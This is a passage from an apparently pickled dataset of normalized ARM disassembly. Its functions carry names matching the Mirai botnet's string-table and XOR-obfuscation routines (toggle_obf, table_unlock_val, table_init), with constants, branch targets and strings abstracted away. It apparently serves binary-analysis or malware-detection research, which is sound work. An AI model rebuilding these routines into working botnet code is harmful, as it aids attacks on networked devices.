R0,R6\nMOV~R1,R10\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nLDR~R3,<STR>\nLDR~R5,[R3]\nCMP~R9,R5\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R6,[SP,0]\nMOV~R7,R3\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R4,R3,R6\nADD~R1,SP,0\nADD~R1,R1,0\nSTR~R7,[R1,R6]\nADD~R3,SP,0\nSTR~R7,[SP,0]\nADD~R3,R3,0\nSTR~R7,[R3]\nSTR~R7,[R3]\nBL~FOO\nLDR~R2,<STR>\nSTRB~R0,[R2,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R2,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R2,0]\nBL~FOO\nAND~R2,R0,0\nMOV~R3,R0,LSR0\nAND~R1,R3,0\nMOV~R3,R0,LSR0\nAND~R12,R3,0\nMOV~R0,R0,LSR0\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nBEQ~FOO\nSUB~R3,R2,0\nCMP~R2,0\nCMPNE~R3,0\nBLS~FOO\nCMP~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPEQ~R1,0\nBEQ~FOO\nCMP~R2,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R1,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R1,0\nBLS~FOO\nCMP~R2,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R1,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R1,0\nBLS~FOO\nCMP~R2,0\nCMPEQ~R1,0\nBEQ~FOO\nCMP~R2,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R1,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R1,0\nBLS~FOO\nCMP~R2,0\nBHI~FOO\nSUB~R3,R2,0\nCMP~R2,0\nCMPNE~R3,0\nBLS~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nMOVNE~LR,0\nMOVEQ~LR,0\nBEQ~FOO\nMOV~R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nORR~R3,R3,R0\nORR~R3,R3,R12,LSL0\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nLDR~R3,<STR>\nSTR~R2,[R3,0]\nSTRB~LR,[R3,0]\nSTRB~LR,[R3,0]\nMOV~R0,R3\nMOV~R1,0\nBL~FOO\nLDR~R1,<STR>\nSTRB~R0,[R1,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R1,0]\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQB~R3,[R11,0]\nADDEQ~R3,R3,0\nSTREQB~R3,[R11,0]\nSTRNEB~R7,[R11,0]\nMOVNE~R3,0\nSTRNEB~R3,[R11,0]\nLDR~R2,<STR>\nLDR~R3,[R2,0]\nSTR~R3,[R11,0]\nSTRB~R7,[R11,0]\nSTRB~R7,[R11,0]\nMOV~R0,R2\nMOV~R1,R11\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTRB~R0,[R11,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R11,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R7,[SP,0]\nLDR~R1,<STR>\nLDR~R3,[R1,0]\nSTR~R3,[SP,0]\nLDR~R3,[R11]\nMOV~R3,R3,LSR0\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nSTR~R4,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nCMP~R3,0\nBLE~FOO\nMOV~R9,R5\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R4,0\nMOV~R5,R4\nADD~R2,SP,0\nADD~R2,R2,0\nLDR~R3,[SP,0]\nADD~R6,R2,R3\nADD~R7,SP,0\nLDR~R1,[SP,0]\nSTR~R5,[R1]\nLDR~R3,<STR>\nLDR~R0,[R3]\nSTR~R5,[SP]\nSTR~R5,[SP,0]\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nLDR~R2,[SP,0]\nLDR~R3,[R2]\nCMP~R3,0\nBEQ~FOO\nCMP~R0,0\nBLS~FOO\nMOV~R0,R6\nLDR~R3,<STR>\nLDR~R2,[R3]\nLDR~R3,[SP,0]\nCMP~R3,R2\nBNE~FOO\nLDRB~R3,[SP,0]\nCMP~R3,0\nBNE~FOO\nMOV~R12,R7\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORR~R2,R2,R3,LSL0\nCMP~R2,0\nBEQ~FOO\nMOV~R3,0\nCMP~R2,R3\nBNE~FOO\nLDRB~R3,[R12,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nCMP~R3,R1\nBNE~FOO\nLDRB~R3,[R12,0]\nTST~R3,0\nBEQ~FOO\nTST~R3,0\nBEQ~FOO\nTST~R3,0\nBNE~FOO\nTST~R3,0\nBNE~FOO\nLDR~R2,[R12,0]\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSUB~R3,R3,0\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~LR,R2,R3\nLDR~R3,[R0,0]\nCMP~LR,R3\nBNE~FOO\nCMP~R4,0\nBGT~FOO\nLDR~R3,<STR>\nLDR~R1,[R3]\nMOV~R3,R4,LSL0\nMOV~R2,R4,LSL0\nADD~R3,R3,R2\nADD~R0,R1,R3\nLDR~R3,[R0,0]\nCMP~R3,0\nADDNE~R1,R0,0\nMOVNE~R2,R4\nBNE~FOO\nB~FOO\nMOV~R0,R1\nLDR~R3,[R1,0]\nADD~R1,R1,0\nCMP~R3,0\nBEQ~FOO\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nB~FOO\nMOV~R4,R2\nCMP~R0,0\nBEQ~FOO\nSTR~LR,[R0,0]\nLDR~R3,[R12]\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nBL~FOO\nB~FOO\nMOV~R3,0\nADD~R1,SP,0\nMOV~R2,R3\nSTR~R2,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R2\nADD~R2,SP,0\nMOV~R0,0\nSTR~R0,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nSTR~R0,[SP,0]\nMOV~R6,R0\nMOV~R5,R0\nMOV~R3,R0\nMOV~R7,0\nMOV~R2,R3,LSL0\nMOV~R3,R3,LSL0\nADD~R2,R2,R3\nLDR~R3,<STR>\nLDR~R3,[R3]\nADD~R4,R2,R3\nLDR~R0,[R4,0]\nCMP~R0,0\nMOVHI~R1,0\nBHI~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R1,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nLDR~R2,[R4,0]\nRSB~R3,R2,R3\nCMP~R3,R1\nBLS~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nLDR~R3,[R4,0]\nCMP~R3,0\nSTRLSB~R7,[R4,0]\nSTRLS~R7,[R4,0]\nBLS~FOO\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nSTRB~R3,[R4,0]\nCMP~R3,0\nSTREQB~R7,[R4,0]\nSTREQ~R7,[R4,0]\nBEQ~FOO\nMOV~R0,R4\nBL~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nLDR~R1,[R4,0]\nMOV~R2,R1,LSR0\nMOV~R2,R2,LSL0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R2,R3\nAND~R1,R1,0\nLDR~R3,[R2,-0]\nORR~R3,R3,R0,LSLR1\nSTR~R3,[R2,-0]\nLDR~R0,[R4,0]\nCMP~R5,R0\nMOVLT~R5,R0\nB~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R0,[R4,0]\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,R2,R1\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nLDR~R3,[R4,0]\nCMP~R6,R3\nMOVLT~R6,R3\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nCMP~R3,0\nBLE~FOO\nMOV~R4,0\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nCMP~R6,R5\nMOVGE~R0,R6\nMOVLT~R0,R5\nADD~R3,SP,0\nSTR~R3,[SP]\nADD~R0,R0,0\nADD~R1,SP,0\nADD~R2,SP,0\nMOV~R3,R4\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nSTR~R4,[SP,0]\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R3,R3,R2\nSTR~R3,[SP,0]\nMOV~R2,R4,LSL0\nMOV~R3,R4,LSL0\nADD~R2,R2,R3\nLDR~R3,<STR>\nLDR~R3,[R3]\nADD~R4,R2,R3\nLDR~R2,[R4,0]\nCMN~R2,0\nBEQ~FOO\nMOV~R3,R2,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R2,R2,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nMOV~R2,0\nSTR~R2,[SP,0]\nADD~R2,R2,0\nSTR~R2,[SP,0]\nLDR~R0,[R4,0]\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nMOV~R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nBL~FOO\nLDR~R3,[SP,0]\nORRS~R6,R0,R3\nBNE~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nBL~FOO\nLDR~R3,<STR>\nLDRB~R2,[R3]\nLDRB~R1,[R3,0]\nORR~R1,R2,R1,LSL0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R5,R0,LSR0\nLDR~R3,<STR>\nLDR~LR,[R3]\nCMP~LR,0\nBLE~FOO\nLDR~R3,<STR>\nLDR~R12,[R3]\nMOV~R0,R6\nMOV~R1,R12\nLDRB~R3,[R12,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R5\nBHI~FOO\nLDRB~R3,[R12,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R5\nBHI~FOO\nADD~R0,R0,0\nADD~R12,R12,0\nCMP~LR,R0\nBNE~FOO\nMOV~R1,0\nSTR~R1,[R4]\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nMOV~R1,0\nSTRB~R1,[R4,0]\nMOV~R2,0\nSTR~R2,[R4,0]\nB~FOO\nLDR~R2,[R4,0]\nMOV~R3,R2,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R2,R2,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nADD~R0,R4,0\nADD~R1,R4,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[R4,0]\nSUB~R3,R3,0\nSTR~R3,[R4,0]\nMOV~R3,0\nLDR~R2,[SP,0]\nSTR~R3,[R2]\nADD~R10,R4,0\nLDR~R2,[R4,0]\nLDR~R0,[R4,0]\nADD~R1,R10,R2\nRSB~R2,R2,0\nADD~R3,R3,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nLDREQ~R1,[SP,0]\nSTREQ~R3,[R1]\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R2,[SP,0]\nLDR~R3,[R2]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nSTRB~R3,[R4,0]\nCMP~R3,0\nMOVHI~R3,0\nSTRHIB~R3,[R4,0]\nMOVHI~R1,0\nSTRHI~R1,[R4,0]\nBHI~FOO\nMOV~R0,R4\nBL~FOO\nB~FOO\nLDR~R3,[R4,0]\nADD~R3,R3,R0\nSTR~R3,[R4,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R4,0]\nLDR~R3,[R4,0]\nSUB~R3,R3,0\nCMP~R3,0\nLDRLS~PC,[PC,R3,LSL0]\nB~FOO\nADD~R5,R4,0\nMOV~R7,0\nB~FOO\nLDRB~R3,[R5]\nCMP~R3,0\nBNE~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nADDEQ~R5,R5,0\nADDEQ~R7,R7,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R8,SP,0\nMOV~R0,R8\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R6,[SP,0]\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBNE~FOO\nADD~R5,R5,0\nADD~R7,R7,0\nLDR~R0,[R4,0]\nMOV~R1,R8\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nB~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nB~FOO\nLDRB~R3,[R2,R5]\nCMP~R3,0\nMOVEQ~R3,0\nSTREQB~R3,[R2,R5]\nBEQ~FOO\nCMP~R3,0\nSUBEQ~R3,R3,0\nSTREQB~R3,[R2,R5]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nLDR~R0,[R4,0]\nMOV~R1,R5\nMOV~R3,0\nBL~FOO\nADD~R5,R5,0\nADD~R7,R7,0\nLDR~R3,[R4,0]\nCMP~R7,R3\nBLT~FOO\nCMP~R7,0\nMOVGT~R3,0\nSTRGT~R3,[R4,0]\nBGT~FOO\nB~FOO\nLDR~R1,[R4,0]\nSUB~R0,R1,0\nCMP~R0,0\nBLE~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R7,R0,0\nCMN~R7,0\nBNE~FOO\nB~FOO\nSUBS~R0,R0,0\nBNE~FOO\nMOV~R0,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBNE~FOO\nMOV~R0,R10\nLDR~R1,[R4,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBEQ~FOO\nCMP~R7,0\nBLE~FOO\nLDR~R3,[R4]\nLDR~R0,[R4,0]\nLDR~R1,[R3]\nLDRB~R2,[R3,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nLDR~R1,[R4,0]\nSUB~R0,R1,0\nCMP~R0,0\nBLE~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R7,R0,0\nCMN~R7,0\nBNE~FOO\nB~FOO\nSUBS~R0,R0,0\nBNE~FOO\nMOV~R0,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBEQ~FOO\nCMP~R7,0\nBLE~FOO\nLDR~R3,[R4]\nLDR~R0,[R4,0]\nLDR~R1,[R3,0]\nLDRB~R2,[R3,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R10\nLDR~R1,[R4,0]\nLDR~R3,[SP,0]\nSUB~R3,R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nSTRB~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R10\nLDR~R1,[R4,0]\nLDR~R3,[SP,0]\nSUB~R3,R3,0\nBL~FOO\nMOV~R7,R0\nMOV~R0,0\nBL~FOO\nCMN~R7,0\nBNE~FOO\nB~FOO\nMOV~R2,0\nSTRB~R2,[R4,0]\nMOV~R3,0\nSTR~R3,[R4,0]\nMOV~R7,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R7,0\nB~FOO\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nORR~R2,R2,R3,LSL0\nLDR~R8,[R4]\nLDR~R3,[R4,0]\nSTR~R3,[SP,0]\nSTRB~R2,[SP,0]\nMOV~R2,R2,ASR0\nSTRB~R2,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R5,R3\nORRGT~R5,R3,0\nCMP~R5,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nMOV~R6,R0\nCMN~R0,0\nMOVEQ~R0,R5\nBLEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nSUBS~R5,R0,0\nBEQ~FOO\nMOV~R7,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R7,[SP,0]\nLDR~R4,[R5,0]\nBL~FOO\nLDRB~R1,[R5]\nBL~FOO\nLDR~R3,[R4,R0,LSL0]\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,R7\nBL~FOO\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nMOV~R0,R5\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nADD~R2,SP,0\nADD~R2,R2,0\nLDR~R3,[SP,0]\nADD~R1,R2,R3\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R7\nBL~FOO\nMOV~R1,0\nSTRB~R1,[SP,0]\nMOV~R0,R6\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,R8,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,[R8]\nLDRB~R2,[R8,0]\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,R8,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,[R8,0]\nLDRB~R2,[R8,0]\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nMOV~R2,0\nSTR~R2,[R4,0]\nB~FOO\nMOV~R7,0\nCMP~R7,0\nBEQ~FOO\nLDR~R2,[R4,0]\nCMP~R7,R2\nMOVLT~R1,R7\nMOVGE~R1,R2\nRSB~R2,R1,R2\nSTR~R2,[R4,0]\nMOV~R0,R10\nADD~R1,R10,R1\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R4,0\nBLE~FOO\nB~FOO\nMOV~R2,0\nB~FOO\nCMP~R7,0\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p152
L6264L
tp153
a(S'table_retrieve_val'
p154
S'"MOV~R0,R0,LSL0\nLDR~R3,<STR>\nADD~R0,R0,R3\nCMP~R1,0\nLDRNEB~R3,[R0,0]\nLDRNEB~R2,[R0,0]\nORRNE~R3,R3,R2,LSL0\nSTRNE~R3,[R1]\nLDR~R0,[R0]\nRET"'
p155
L40L
tp156
a(S'toggle_obf'
p157
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R0,R0,LSL0\nBIC~R0,R0,0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nLDR~R3,<STR>\nADD~R0,R0,R3\nLDR~R3,<STR>\nLDR~R2,[R3]\nAND~R6,R2,0\nMOV~R3,R2,LSR0\nAND~R5,R3,0\nMOV~R3,R2,LSR0\nAND~R4,R3,0\nMOV~LR,R2,LSR0\nLDRB~R2,[R0,0]\nLDRB~R3,[R0,0]\nORRS~R3,R2,R3,LSL0\nLDMEQFD~SP!,{R4-R6,PC}\nMOV~R1,0\nADD~R12,R0,0\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,R6,R3\nSTRB~R3,[R1,R2]\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,R5,R3\nSTRB~R3,[R1,R2]\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,R4,R3\nSTRB~R3,[R1,R2]\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,LR,R3\nSTRB~R3,[R1,R2]\nADD~R1,R1,0\nLDRB~R3,[R0,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R1\nBGT~FOO\nLDMFD~SP!,{R4-R6,PC}"'
p158
L176L
tp159
a(S'table_lock_val'
p160
S'"STR~LR,[SP,-0]\nAND~R0,R0,0\nBL~FOO\nLDR~PC,[SP]"'
p161
L16L
tp162
a(S'table_unlock_val'
p163
S'"STR~LR,[SP,-0]\nAND~R0,R0,0\nBL~FOO\nLDR~PC,[SP]"'
p164
L16L
tp165
a(S'add_entry'
p166
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R7,R1\nMOV~R5,R2\nAND~R4,R0,0\nMOV~R0,R2\nBL~FOO\nMOV~R6,R0\nMOV~R1,R7\nMOV~R2,R5\nBL~FOO\nLDR~R3,<STR>\nSTR~R6,[R3,R4,LSL0]\nMOV~R4,R4,LSL0\nADD~R4,R4,R3\nSTRB~R5,[R4,0]\nMOV~R5,R5,ASR0\nSTRB~R5,[R4,0]\nLDMFD~SP!,{R4-R7,PC}"'
p167
L72L
tp168
a(S'table_init'
p169
S'"STR~LR,[SP,-0]\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0